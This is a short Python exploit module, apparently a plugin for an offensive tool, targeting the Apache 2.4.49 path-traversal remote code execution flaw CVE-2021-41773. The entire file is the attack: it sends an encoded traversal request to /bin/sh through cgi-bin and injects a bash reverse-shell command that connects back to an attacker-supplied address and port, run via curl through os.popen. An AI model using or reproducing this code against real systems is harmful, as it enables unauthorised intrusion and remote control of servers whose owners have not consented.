# [PLUGIN INITIAL ACCESS] Apache 2.4.49 RCE CVE-2021-41773

import requests
import os

def exploit(ip_dest: str, port_dest: int, ip_src: str, port_src: int) -> bool | Exception:
    """
    Try to exploit the vulnerability
    """
    try:
        host = 'http://{0}:{1}'.format(ip_dest, port_dest)
        print('[+] Attempting to gain initial access with CVE-2021-41773 on {}'.format(host))
        r = requests.get(host)
        payload = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'            
        rs = 'bash -c "/bin/sh -i >& /dev/tcp/{0}/{1} 0>&1"'.format(ip_src, port_src)
        cmd = "curl -s --path-as-is '{1}{2}' --data 'echo Content-Type: text/plain; echo; {0}'".format(rs, host, payload)
        os.popen(cmd)
        return True
        
    except Exception as e:
        return e
